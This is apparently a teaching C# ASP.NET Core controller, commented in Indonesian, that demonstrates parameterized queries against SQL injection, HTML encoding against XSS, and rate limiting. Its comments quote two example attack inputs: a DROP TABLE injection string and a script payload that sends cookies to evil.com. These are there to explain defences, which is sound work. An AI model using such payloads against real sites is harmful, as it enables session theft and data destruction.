// ============================================================
// Nama File: SecurityController.cs — Controller Demo Keamanan API
// Folder: 11-Security/Source/Controllers/
// ============================================================
// 1. PENJELASAN FOLDER (Security):
//    - Tujuan: Mendemonstrasikan praktik keamanan wajib yang harus diterapkan pada setiap API backend produksi.
//    - Kapan Digunakan: Saat membangun fitur yang menerima input pengguna (form, query string) atau yang perlu dilindungi dari traffic berlebihan.
//    - Hubungan: Menggunakan AppDbContext.cs untuk kueri database aman dan mengintegrasikan kebijakan Rate Limiting dari Program.cs.
//
// 2. PENJELASAN FILE:
//    - Fungsi & Tanggung Jawab: Menampilkan 3 demonstrasi keamanan: SQL Injection Prevention, XSS Sanitization, dan Rate Limiting.
//    - Mengapa Diperlukan: Memberikan contoh praktis tentang kerentanan keamanan yang umum dan cara mitigasinya di lingkungan .NET.
//    - Jika Dihapus: Tidak ada demonstrasi fungsional tentang keamanan API pada modul ini.
// ============================================================

using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.RateLimiting;
using Microsoft.EntityFrameworkCore;
using System.Web;
using TesBackendNet.Security.Data;

namespace TesBackendNet.Security.Controllers;

/// <summary>
/// TUJUAN CLASS:
/// Controller yang mendemonstrasi 3 kategori keamanan penting dalam pengembangan backend:
/// 1. SQL Injection Prevention menggunakan parameterized query.
/// 2. XSS (Cross-Site Scripting) Prevention menggunakan HTML encoding.
/// 3. Rate Limiting untuk mencegah serangan brute-force dan DoS.
/// </summary>
[ApiController]
[Route("api/security")]
public class SecurityController : ControllerBase
{
    private readonly AppDbContext _context;

    /// <summary>
    /// CONSTRUCTOR: Menyuntikkan AppDbContext untuk demonstrasi kueri aman.
    /// </summary>
    public SecurityController(AppDbContext context)
    {
        _context = context;
    }

    // ================================================================
    // 1. SQL INJECTION PREVENTION
    // ================================================================

    /// <summary>
    /// FUNGSI METHOD: Pencarian produk menggunakan LINQ yang AMAN dari SQL Injection.
    /// PARAMETER: name (string dari query string).
    /// 
    /// MENGAPA LINQ AMAN DARI SQL INJECTION?
    /// EF Core mengubah LINQ query menjadi SQL menggunakan Parameterized Query secara otomatis di balik layar.
    /// Artinya: nilai variabel `name` TIDAK pernah digabungkan langsung ke string SQL.
    /// 
    /// Contoh SQL yang dihasilkan EF Core:
    ///   SELECT * FROM Products WHERE Name LIKE @p0
    ///   Parameter @p0 = '%value%'   ← Nilai aman, tidak dapat mengubah struktur SQL
    /// 
    /// Contoh serangan SQL Injection yang GAGAL karena parameterization:
    ///   Input penyerang: `'; DROP TABLE Products; --`
    ///   Query yang terbentuk: WHERE Name LIKE '%''; DROP TABLE Products; --%'
    ///   Ini diperlakukan sebagai string literal, BUKAN perintah SQL.
    /// </summary>
    [HttpGet("sql-safe")]
    public async Task<IActionResult> SearchSafe([FromQuery] string name)
    {
        // LINQ + EF Core = Otomatis Parameterized Query (AMAN dari SQL Injection)
        var products = await _context.Products
            .Where(p => p.Name.Contains(name))
            .ToListAsync();

        return Ok(new { Method = "Safe (LINQ)", Data = products });
    }

    /// <summary>
    /// FUNGSI METHOD: Pencarian produk menggunakan Raw SQL yang AMAN melalui FromSqlInterpolated.
    /// 
    /// PERBEDAAN FromSqlInterpolated vs FromSqlRaw:
    /// - `FromSqlInterpolated($"... {param}")`: AMAN. EF Core mengkonversi ekspresi interpolasi string
    ///   menjadi parameter SQL secara otomatis (mirip dengan string interpolation tapi parameterized).
    /// - `FromSqlRaw("... " + userInput)`: BERBAHAYA. Menggabungkan input pengguna langsung ke string SQL,
    ///   rentan SQL Injection. JANGAN PERNAH lakukan ini.
    /// </summary>
    [HttpGet("sql-raw-safe")]
    public async Task<IActionResult> SearchRawSafe([FromQuery] string name)
    {
        // FromSqlInterpolated: AMAN karena ekspresi interpolasi diubah menjadi SQL parameter
        var products = await _context.Products
            .FromSqlInterpolated($"SELECT * FROM Products WHERE Name LIKE {"%" + name + "%"}")
            .ToListAsync();

        return Ok(new { Method = "Safe (FromSqlInterpolated)", Data = products });
    }

    // ================================================================
    // 2. XSS (CROSS-SITE SCRIPTING) PREVENTION
    // ================================================================

    /// <summary>
    /// FUNGSI METHOD: Membersihkan (sanitize) input komentar pengguna dari payload XSS berbahaya.
    /// PARAMETER: UserCommentRequest (objek berisi field Comment).
    /// 
    /// APA ITU XSS (Cross-Site Scripting)?
    /// Penyerang menyisipkan kode JavaScript berbahaya ke dalam input teks. Jika kode ini disimpan ke database
    /// dan ditampilkan kembali ke pengguna lain tanpa sanitasi, browser korban akan mengeksekusinya.
    /// 
    /// Contoh payload XSS berbahaya:
    ///   Input: `<script>document.cookie = document.cookie; fetch('https://evil.com?c='+document.cookie)</script>`
    /// 
    /// CARA MITIGASI (HttpUtility.HtmlEncode):
    /// Mengubah karakter khusus HTML menjadi entitas HTML yang aman:
    ///   `<` → `&lt;`
    ///   `>` → `&gt;`
    ///   `"` → `&quot;`
    ///   `&` → `&amp;`
    /// Sehingga browser akan menampilkan teks literal, BUKAN mengeksekusi sebagai kode.
    /// </summary>
    [HttpPost("xss-sanitize")]
    public IActionResult SanitizeInput([FromBody] UserCommentRequest request)
    {
        // HtmlEncode: Mengubah tag HTML berbahaya menjadi representasi teks yang aman
        var sanitizedComment = HttpUtility.HtmlEncode(request.Comment);

        return Ok(new
        {
            Original  = request.Comment,
            Sanitized = sanitizedComment,
            Message   = "Input berhasil disanitasi!"
        });
    }

    // ================================================================
    // 3. RATE LIMITING (.NET 8 BUILT-IN RATE LIMITER)
    // ================================================================

    /// <summary>
    /// FUNGSI METHOD: Endpoint yang dilindungi oleh kebijakan Rate Limiting "FixedWindow".
    /// 
    /// APA ITU RATE LIMITING?
    /// Membatasi jumlah request yang dapat dilakukan satu IP/klien dalam jangka waktu tertentu.
    /// Tanpa rate limiting, penyerang dapat melakukan:
    ///   - Brute Force Attack: Mencoba ribuan kombinasi password per detik.
    ///   - Denial of Service (DoS): Membanjiri server dengan jutaan request hingga server down.
    /// 
    /// CARA KERJA [EnableRateLimiting("FixedWindow")]:
    /// - Policy "FixedWindow" dikonfigurasi di Program.cs menggunakan `AddRateLimiter`.
    /// - Contoh konfigurasi: Max 5 request per 60 detik per IP.
    /// - Saat limit terlampaui, ASP.NET Core otomatis mengembalikan HTTP 429 Too Many Requests.
    /// </summary>
    [HttpGet("rate-limited")]
    [EnableRateLimiting("FixedWindow")]
    public IActionResult GetRateLimited()
    {
        return Ok(new { Message = "Berhasil mengakses endpoint yang dibatasi rate limit!" });
    }
}

/// <summary>
/// TUJUAN CLASS: DTO sederhana untuk menerima payload komentar pengguna dari request body JSON.
/// </summary>
public class UserCommentRequest
{
    /// <summary>Teks komentar dari pengguna yang akan disanitasi.</summary>
    public string Comment { get; set; } = string.Empty;
}
